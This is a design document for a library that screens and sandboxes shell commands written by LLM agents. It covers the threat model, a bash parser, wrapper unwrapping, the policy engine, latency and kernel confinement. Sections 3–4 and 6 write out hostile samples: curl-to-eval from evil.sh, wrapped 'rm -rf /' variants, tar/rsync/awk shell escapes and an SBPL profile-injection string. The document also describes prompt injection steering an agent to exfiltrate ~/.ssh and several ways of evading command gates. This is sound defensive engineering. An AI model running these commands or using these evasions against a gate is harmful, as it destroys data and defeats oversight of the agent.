# Design

A low-latency library that evaluates untrusted shell commands from an LLM agent
before they execute, and confines whatever it lets through.

Measured on an M2 MacBook Air, release build, 58 000 samples: **p50 2.8 µs,
p99 13.4 µs, worst case 35.7 µs** over a 145-command corpus. Inputs
constructed to be as expensive as the parser's limits permit peak at
**2.40 ms**, against a **10 ms** budget. § 5 breaks down where that goes.

---

## 1. The problem

An autonomous agent produces a shell command and something has to decide
whether to run it. The decision has three properties that pull against each
other:

- **It happens constantly.** An agent doing real work runs hundreds of commands
  a session. Anything that adds perceptible latency to every one of them
  changes how the agent is used, and a gate that makes an agent feel slow gets
  switched off.
- **The input is adversarial in shape even when it is not in intent.** A model
  that has read the internet writes `find . -exec rm {} \;` because that is
  idiomatic, not because it is evading anything. The same construct is what
  evasion looks like. A system that cannot tell them apart has to handle both.
- **Being wrong is expensive in both directions.** Letting through
  `rm -rf /` costs a machine. Blocking `cargo build` costs the agent's
  usefulness, and then costs the gate its existence.

## 2. Threat model

The adversary is **the command text**, not a person. Three sources produce it,
and the same defence covers all three because they are indistinguishable at
this layer:

| Source | Example |
|---|---|
| Model error | An agent misreads a path and writes `rm -rf /` where it meant `rm -rf ./` |
| Prompt injection | A file the agent read contains instructions to exfiltrate `~/.ssh` |
| A user driving the agent at a target they do not own | Deliberate misuse of a legitimate tool |

Explicitly **out of scope**: a local attacker with a debugger on the same
machine, a malicious kernel or hypervisor, and side channels. This is a
containment boundary for code an agent generates, not a defence against someone
with a foothold beside it.

The key adversarial assumption: **the adversary picks the input.** That is why
§ 5 reports the worst case reachable under the parser's limits and not the
median of ordinary work — the median describes a benign day, and the budget has
to hold on the other kind.

## 3. Two layers, and why one is not enough

This is the load-bearing decision in the whole design.

```
       agent produces a command
                 │
                 ▼
   ┌─────────────────────────────┐
   │  Layer 1: the gate          │   ~3 µs   userspace, no syscalls
   │  parse → resolve → unwrap   │           reads the command text
   │  → match → decide           │
   └─────────────┬───────────────┘
                 │
      deny ◄─────┼─────► ask ──► human
                 │
                 ▼ allow / confine
   ┌─────────────────────────────┐
   │  Layer 2: enforcement       │   fixed setup cost, ~0 per syscall
   │  Seatbelt / Landlock+seccomp│   sees what actually happens
   └─────────────┬───────────────┘
                 │
                 ▼
          the command runs
```

**Layer 1 is not a security boundary, and this library never claims it is.**
Static analysis of shell is undecidable. `eval "$(curl evil.sh)"` is a one-line
proof: deciding what that does requires running it. Anything that reads command
text can be defeated by text that computes itself.

So what is Layer 1 *for*?

- **Rejection.** Refusing `rm -rf /` in 3 µs beats containing it in a VM. Most
  dangerous commands are dangerous in ways that are perfectly visible.
- **Explanation.** A kill signal tells an agent nothing about what to do next.
  A finding that names a rule, a reason, and the exact span that tripped it
  lets the agent correct itself and lets a human review the escalation. This is
  the thing enforcement fundamentally cannot provide.
- **Capability derivation.** The decision produces the set of effects the
  command wants, which is what configures Layer 2. Without it, every command
  gets the same profile, which means the profile has to be permissive enough
  for the most demanding command anyone runs.

**Layer 2 is the boundary.** It evaluates the syscall that actually happens
rather than the text that predicted it, so no amount of dynamic construction
gets past it.

The two are complementary in a specific way:

| | Layer 1 (gate) | Layer 2 (enforce) |
|---|---|---|
| when | before execution | at each syscall |
| sees | the command text | what actually happened |
| cost | ~3 µs per command | fixed setup, ~0 per syscall |
| defeated by | any dynamic construction | nothing in userspace |
| produces | a reason a human can read | a kill |

**Reading a Layer 1 `Allow` as a safety guarantee is the one way to use this
library that is worse than not using it.** `Allow` means *no rule objected*.
The policy default is therefore `confine`, not `allow` — "no rule matched"
means the ruleset had nothing to say, which for agent-authored input is the
common case rather than evidence of safety.

## 4. Layer 1: the decision path

Five crates, no external dependencies (§ 9):

```
shellguard-parse    bash → syntax tree + taint lattice
shellguard-policy   rules, compiled matcher, prefilter
shellguard-gate     resolve → unwrap → match → decide
shellguard-enforce  Seatbelt / Landlock + seccomp
shellguard-ffi      C ABI
```

### 4.1 Parsing for judgement, not for execution

A shell parser can treat `$(...)` as an opaque string it hands to the expander
later. This one parses inside it, because the command in there runs with the
same privileges as the one around it.

The completeness of that walk is the whole game. Every place it fails to look
is a place a command can hide. The non-obvious ones:

```bash
echo ${X:-$(curl evil.sh)}   # inside a default-value expansion
cat foo > $(mktemp)          # inside a redirect target
case $(id) in ...            # inside a case subject
diff <(sort a) <(sort b)     # process substitution
$'\x72\x6d' -rf /            # ANSI-C quoting: this is `rm`
echo $(echo ")" ; id)        # a quoted paren a naive scanner stops at
```

That last one matters more than it looks. A paren counter that ignores quoting
terminates the substitution early, which detaches the rest of the command from
the tree — and a command that is not in the tree is invisible to every rule.
Anything reaching a parser by way of an LLM should be assumed to contain
exactly this shape.

### 4.2 The taint lattice

`rm -rf build/` and `rm -rf $TARGET` have identical syntax. Only one can be
reasoned about ahead of time, so every word carries how much of its value is
knowable:

```
Static  <  Glob  <  Variable  <  Dynamic
```

Concatenation joins by maximum: `build/$X` is `Variable`. The ordering encodes
*how badly uncertainty defeats analysis*, which is not the same as how
uncertain the value is:

- A **glob** is filesystem-dependent but shape-constrained — `*.log` can never
  expand to `/etc/passwd`.
- A **variable** can hold anything, but nothing new *executes* to produce it.
- A **command substitution** runs another program to produce the value, so it
  is both unbounded and itself a thing that needs judging.

The practical consequence is that the gate never guesses. A tainted path
argument is reported as `unresolved`, not assumed to be inside the workspace —
treating `$TARGET` as safe because its literal prefix is empty would be the
most dangerous possible default.

### 4.3 Opacity: the honest core

Tracked separately from taint, because it is a different kind of failure.

Every rule keys on program identity. When the program name is itself computed,
*no identity-keyed rule applies* — and "matched no deny rule" would otherwise
be silently read as "safe".

```
Transparent   git status          the program is a literal
Indirect      $EDITOR file        from a variable
Opaque        $(get_cmd) -rf /    computed by running something else
```

`Opaque` is denied outright. `Indirect` escalates rather than denying, because
`$EDITOR file` and `$PYTHON script.py` are ordinary and a gate that refuses
them is a gate nobody keeps. This calibration difference — same
unjudgeability, different verdicts, because one shape is common in honest work
and the other is not — recurs throughout the ruleset.

### 4.4 Wrapper unwrapping

Because every rule keys on program identity, the cheapest bypass is to not be
the program:

```bash
sudo rm -rf /            # a sudo command
timeout 5 rm -rf /       # a timeout command
find . -exec rm {} \;    # a find command
xargs rm                 # an xargs command
bash -c 'rm -rf /'       # a bash command
```

None match a rule about `rm`. All delete the same files.

The answer is not to add `sudo`, `timeout`, `find` and `xargs` to every `rm`
rule — that multiplies out and still loses to the combination nobody
enumerated. It is to recover the inner command and judge *that*, so one rule
about `rm` covers `sudo env timeout 5 nice -n 10 rm -rf /` without anyone
having written that down.

Unwrapping handles `sudo`, `doas`, `env`, `nohup`, `setsid`, `nice`, `ionice`,
`stdbuf`, `timeout`, `taskset`, `watch`, `strace`, `xargs`, `command`,
`find -exec`/`-execdir`/`-ok`, and literal `sh -c` payloads (which are parsed
recursively). It is bounded by depth, and hitting the bound is *reported* —
`Incomplete::UnwrapDepth` — rather than silently producing a clean verdict.

A related class is options whose *values* are commands, where the program is on
nobody's dangerous list:

```bash
tar --checkpoint-action=exec=/bin/sh
rsync --rsh-command=/bin/sh
awk 'BEGIN{system("rm -rf /")}'
git config core.pager '...'     # a delayed shell escape
```

These are rules rather than unwrapping, because the payload is not in argv
position.

### 4.5 The policy engine

Rules are matched against `CommandFacts` — a command already reduced to the
properties rules ask about. The policy layer never touches the filesystem or
the syntax tree, which is what makes the ruleset testable with a struct literal
instead of a fixture directory.

Compilation happens once at load:

- Rules naming a program go in a **hash bucket** keyed on the resolved
  basename, so `git status` never looks at a single `rm` rule.
- Rules applying to any program are narrowed by an **Aho-Corasick prefilter**
  over their literal needles, so a rule about `/etc/shadow` costs nothing on a
  command that does not mention it. One pass over the text, independent of how
  many needles exist — adding the 201st rule costs nothing at evaluation time.

The current ruleset is 48 rules, 55 prefilter patterns, and **4 rules that must
be evaluated on every command** (those whose predicates imply no literal, such
as "has a write redirection"). `shellguard rules` reports these, because a
ruleset quietly drifting towards unindexable is how a fast matcher becomes a
slow one.

Prefilter soundness has one subtlety: a negated predicate contributes **no**
needles. `not arg-eq safe` matches precisely when its needle is *absent*, so
indexing it would drop the rule from consideration exactly when it should fire.
Likewise a disjunction only prefilters if *every* branch contributes one.

### 4.6 Verdicts combine by severity, not by order

```
Allow  <  Confine  <  Ask  <  Deny
```

A command matching both an `allow` rule and a `deny` rule is denied. There is
no precedence to reason about and no way for an over-broad allow to accidentally
outrank a specific deny. A policy needing an exception carves it out with a
predicate on the deny rule, where it is visible in the rule that grants it.

## 5. The latency budget

Nothing on the decision path forks, execs, or opens a socket. The only syscalls
are the `stat` and `readlink` behind path resolution, cached on the (program,
directory) pairs an agent hits repeatedly — 99.9 % hit rate across the corpus.
What remains is parsing and matching, both linear in command length.

That is why the budget is a **deadline** rather than a timeout on a worker: no
step can block, so a check between phases bounds the whole thing, and there is
no thread to cancel.

Measured, release build, M2 MacBook Air, 58 000 samples over 145 commands:

| | full gate | parse only |
|---|---|---|
| p50 | 2.8 µs | 542 ns |
| p90 | 7.2 µs | 875 ns |
| p99 | 13.4 µs | 1.5 µs |
| p99.9 | 19.2 µs | 1.5 µs |
| max | 35.7 µs | 21.9 µs |

Roughly 20 % of the time is parsing; the rest is resolution, unwrapping and
matching. The slowest ordinary commands are the deep wrapper chains, which is
expected — each layer is a fresh command to normalise and match.

**Percentiles, not a mean.** A mean of 200 µs is consistent with one command in
a thousand taking 50 ms, and that one command is the one that matters because
an adversary picks the input. This is also why the harness is a hundred lines
of `Instant::now` rather than a statistics framework: Criterion is built to
detect small differences in a *mean* between revisions, and discards outliers
as noise. Here the outliers are the measurement.

### Adversarial inputs

Constructed to cost as much as possible while staying inside the parser's
limits. These are the numbers the budget actually rests on:

| input | bytes | max |
|---|---|---|
| 2 000-stage pipeline | 17 997 | **2.40 ms** |
| 9 000 arguments | 36 005 | 1.74 ms |
| 1 000 quote-confusing substitutions | 13 005 | 1.22 ms |
| 800 nested parameter defaults | 9 605 | 909 µs |
| depth-30 nesting, 4 KiB payload | 4 098 | 844 µs |
| 3 000 sibling substitutions | 18 005 | 504 µs |
| over the byte cap | 200 005 | **250 ns** |

Worst case **2.40 ms — 4× headroom** against the 10 ms budget. The last row is
the point of having a cap: oversized input is rejected on sight without
parsing.

Three limits bound the work, and each is checked before it can be exceeded
rather than after:

```rust
max_bytes: 64 KiB     max_depth: 32     max_nodes: 4096
```

The node budget is **shared across nesting**, so sibling substitutions cannot
multiply total work — that is what keeps "3 000 sibling substitutions" at
504 µs instead of quadratic.

Exceeding any limit is a `Deny`, not a best effort.

## 6. Layer 2: enforcement

| | macOS | Linux |
|---|---|---|
| filesystem scope | Seatbelt (SBPL) | Landlock ABI 1+ |
| syscall removal | — | seccomp-BPF |
| network scope | Seatbelt, coarse | Landlock ABI 4+ |
| entitlement required | none | none |
| **verified here** | **yes, against the kernel** | **no — compiles only** |

### 6.1 macOS: Seatbelt, and why not Endpoint Security

Endpoint Security is the framework that genuinely intercepts syscalls on macOS:
`ES_EVENT_TYPE_AUTH_EXEC`, `AUTH_OPEN`, `AUTH_UNLINK` block the operation until
a client responds. It also requires the
`com.apple.developer.endpoint-security.client` entitlement — granted by Apple
case by case — plus running as root with Full Disk Access. A library usable
only by organisations who have been through that process is not usable.

Seatbelt requires no entitlement, is enforced in the kernel through the MAC
framework, and costs nothing per syscall because the policy is evaluated in
kernel context rather than by a userspace supervisor.

Its drawback stated plainly: `sandbox_init` has been formally deprecated since
macOS 10.8 and SBPL is undocumented. The practical argument for depending on it
anyway is that it has backed Chrome's and Firefox's renderer sandboxes for over
a decade, so its removal would be noticed by considerably more people than us.

**Profile generation is a security boundary, not string formatting.** SBPL is
s-expression source compiled by the kernel, so an unescaped `"` in a workspace
path closes the string and the rest becomes policy — a directory named
`ws") (allow default) (deny nothing` would disable the sandbox from inside the
profile meant to configure it. Paths are escaped, control characters are
refused outright, and there is a test for exactly that attack.

One hard-won detail, now a comment in the source: a profile needs
`(literal "/")` or every process dies on `SIGABRT` during dyld startup with no
diagnostic. Granting `(subpath "/usr")` grants access to things *under* `/usr`
but not the lookup of `/` that reaching them goes through. The failure is
indistinguishable from a malformed profile.

### 6.2 Linux: Landlock for paths, seccomp for capabilities

Neither alone is sufficient, and the reason is worth being precise about.

**seccomp cannot express a path.** By the time `openat` is dispatched the
filename is a userspace pointer, and dereferencing it in a filter is unsound —
another thread can rewrite the buffer between the check and the kernel's own
copy. That is a time-of-check race whose timing the attacker controls.

**Landlock evaluates in the LSM hooks**, after the kernel has resolved the
path and against the resolved result. No window to race, and symlinks and bind
mounts are already accounted for. It also costs nothing per syscall: the check
walks an already-cached dentry chain rather than round-tripping to userspace.

What seccomp *is* good for is removing whole capabilities. No confined command
needs to load a kernel module, trace another process, or re-enter a namespace,
and a syscall that cannot be made has no exploitable behaviour.

The denylist covers `ptrace`, `process_vm_*`, mount and namespace operations,
module loading, `kexec`, `bpf`, `perf_event_open`, the keyring calls,
credential changes, `personality`, `userfaultfd`, the file-handle calls, and
**io_uring**.

That last one is the entry whose absence would make the rest decorative.
io_uring services reads, writes and opens through a shared memory ring that the
kernel processes without those operations passing through the syscall dispatch
path seccomp inspects. **A seccomp policy that blocks `openat` but permits
`io_uring_setup` does not block opening files.**

`clone3` is also refused, because it passes its flags in a struct rather than a
register, so seccomp cannot inspect them — refusing it forces the classic
`clone`, whose flags are visible.

**ABI negotiation is not optional.** Each Landlock release adds access bits, and
passing a bit the running kernel does not know returns `EINVAL` — the ruleset is
never created and a binary built against newer headers *silently confines
nothing*. The version is queried first, requested rights are masked to it, and
the negotiated version is returned to the caller so "this kernel cannot restrict
network" is a visible state rather than an assumption. Notably, ABI 1 and 2
cannot see truncation at all, which means `> file` can empty a file whose write
access was denied.

### 6.3 What neither layer gives you

macOS has **no unprivileged equivalent of seccomp**. Linux confinement here is
strictly stronger. A deployment wanting Linux-grade isolation on a Mac should
run commands in a Linux VM through Virtualization.framework rather than trust
Seatbelt to be equivalent — and should amortise the ~1–2 s boot with a warm
pool, because per-command VM startup is 100× the entire gate budget.

## 7. Rollback — designed, not built

**Not implemented.** The design, for whoever picks it up:

`git stash` is the wrong primitive: it mutates the working tree and races with
a command that is still running. The right shape is to write objects without
touching the index —

```
tree=$(git write-tree)          # from the current index, into the odb only
                                 # plus a second tree of hashed untracked files
```

— recording `{HEAD, tree, untracked_tree}` as a checkpoint, and restoring with
`git read-tree -u --reset` followed by `git reset --soft`.

But that only covers files git tracks, and an agent's damage does not respect
that boundary. The complete answer is filesystem-level: an **overlayfs upper
layer** on Linux, or an **APFS snapshot** via `fs_snapshot_create` on macOS.
Both are atomic, instant, and cover everything. The git-level checkpoint is
worth having on top, because it is what produces a *reviewable diff* rather
than an opaque revert.

## 8. Failing closed

Every failure path denies. This is the property that makes the budget safe
rather than merely usually fast.

| condition | verdict |
|---|---|
| command does not parse | `Deny` + `Incomplete::Parse` |
| over a resource limit | `Deny` |
| deadline expired | `Deny` + `Incomplete::Deadline` |
| wrapper chain too deep | `Deny` + `Incomplete::UnwrapDepth` |
| recovered `sh -c` payload does not parse | `Deny` |
| command is not valid UTF-8 (FFI) | `Deny` |
| `NULL` decision pointer (FFI) | reads as `Deny` |
| no rule matched | policy default (`Confine`) |

Input that a shell would accept and this parser rejects is precisely the
interesting case, and not the one to be lenient about. Without the deadline
denying, the bypass would be "make evaluation slow" — arrangeable by an agent
emitting adversarial input, and leaving no trace beyond a latency blip.

## 9. Zero dependencies

Every crate has no external dependencies. About 10 400 lines of Rust, including
a hand-written bash parser, an Aho-Corasick implementation, a policy-file
parser and a JSON serialiser.

That is a deliberate constraint, not an accident of scope. This library is a
security boundary running on the critical path of an autonomous agent. A
transitive dependency tree is an unaudited code-execution surface **inside the
thing whose entire job is to stop unaudited code execution** — and the supply
chain is a live attack path against exactly this kind of software.

The trade is real and worth naming: a hand-written bash parser will have bugs a
mature one would not. It is mitigated by the corpus (§ 10), by resource limits
that bound the blast radius of a parser bug to a wrong verdict rather than a
crash, and by memory safety, which is why Rust rather than C for code parsing
adversarial input.

## 10. The corpus is the specification

145 commands with expected verdicts in `tests/corpus.txt`, kept **separate from
the ruleset that implements them**. When a policy edit moves an entry, someone
has to decide whether that is a fix or a regression — the decision that gets
skipped when the only record of intent is the rules themselves. It runs under
`cargo test`, not only under a tool someone has to remember.

Writing it down immediately found four real bugs, which is the argument for
doing it:

- `sed` and `awk` sat in the blanket read-only allow list. `sed -i` rewrites in
  place; `awk '{print > "/etc/x"}'` writes a file argv never names as a path.
- `device.format` named `mkfs`, but program matching is on the exact basename —
  it missed `mkfs.ext4` and every other real invocation.
- `destructive.truncate-outside` denied `>> ~/.zshrc` under a reason that said
  "truncates". Appending destroys nothing.
- `vcs.force-push` denied. Force-pushing a feature branch is routine and the
  rule cannot tell it from force-pushing `main`.

A second test asserts the corpus keeps at least ten cases of *each* verdict. A
corpus that drifts into being all-deny stops testing calibration, which is most
of what a ruleset gets wrong.

## 11. Known limitations

**The gate is not a boundary.** Stated in § 3 and repeated because it is the
thing most likely to be forgotten. `Allow` means no rule objected.

**Linux enforcement is unverified.** It compiles clean for `x86_64` and
`aarch64` and the logic has unit tests, but it has never run against a Linux
kernel — there is no Linux host here. The macOS path *is* verified end to end:
tests confirm the kernel blocks a write outside the workspace and a read of
`/etc/passwd` while ordinary work inside the workspace succeeds.

**Time-of-check to time-of-use in path classification.** The gate canonicalises
the longest existing ancestor of a path, which catches a symlinked parent
directory. It cannot catch a symlink created between the decision and the
command running. This is not a bug to fix in the gate — it is why the gate is
not the boundary. Landlock and Seatbelt evaluate at the moment of the syscall.

**Rollback is designed, not built** (§ 7).

**No warm sandbox pool.** Each confined command pays profile setup. On macOS
that is small; a VM-based deployment would need pooling.

**No audit log.** Decisions are returned, not persisted. A real deployment
needs an append-only record, and it needs to be written by a supervisor
*outside* the sandbox — which is why `macos::command` confines a child rather
than the current process.

**cgroups are not wired up.** `Profile` carries `max_processes` and
`max_memory_bytes`, and on Linux nothing enforces them yet. Fork bombs are
currently caught by a text rule, which is exactly as weak as it sounds.

**No policy hot-reload.** Changing rules requires restarting the gate.

**Bundled short flags are not fully positional.** `-rf` decomposes into `r` and
`f`, but the gate does not model which flags take values for arbitrary
programs — only for the wrappers it unwraps.
